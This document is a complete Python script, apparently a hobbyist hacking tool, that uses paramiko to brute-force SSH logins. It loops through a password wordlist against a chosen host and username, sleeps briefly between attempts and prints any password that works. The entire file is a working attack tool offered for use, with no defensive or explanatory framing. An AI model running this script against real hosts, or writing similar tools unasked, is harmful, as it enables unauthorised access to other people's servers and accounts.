import paramiko
import time
import sys
import argparse


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

class start:
    def __init__(self,host,username,wordlist):
        self.connecting = None
        self.host_user = host
        self.username = username
        self.wordlist = wordlist

    def connect(self):
        self.connecting = paramiko.SSHClient()
        self.connecting.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            with open(f"{self.wordlist}",'r',encoding='utf-8') as f:
                wordlist = f.read()
            A = wordlist.split()
        except FileNotFoundError:
            print(f'{RED}[~]{END} File {self.wordlist} {RED}not found{END}')
        
        for i in A:
            
            try:
                self.connecting.connect(hostname=self.host_user,username=self.username,password=i,timeout=5)
                print(f'{GREEN}[*]{END} found --> {GREEN}{i}{END}')
                break
            except paramiko.AuthenticationException:
                print(f'{RED}[~]{END} pass wrong --> {RED}{i}{END}')
            except Exception as E:
                print(f'{RED}[~]{END} Error:\n{RED}[~]{END}{E}')
            except KeyboardInterrupt:
                sys.exit(f'{RED}[~]{END} BY')
            except paramiko.SSHException as ssh_er:
                print(f'{RED}[~]{END} SSH error -->\n{RED}[~]{END} {ssh_er}')
            time.sleep(0.5)
            
        self.connecting.close()    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f'{YELLOW}Help Meno:{END}')
    print(f'{GREEN}<<{END}welcom to ssh connection{GREEN}>>{END}')
    try:
        parser.add_argument('-H','--hostname',required=True,help='target host name')
        parser.add_argument('-u','--username',required=True,help='target user name')
        parser.add_argument('-w','--wordlist',required=True,help='your word list')
        pa = parser.parse_args()
        if pa:
            S = start(f'{pa.hostname}',f'{pa.username}',f'{pa.wordlist}')
            S.connect()
    except KeyboardInterrupt:
        sys.exit(f'{RED}[~]{END} BY')
    except Exception as ER:
        print(f'{RED}[~]{END} Error -->\n{RED}[~]{END} {ER}')
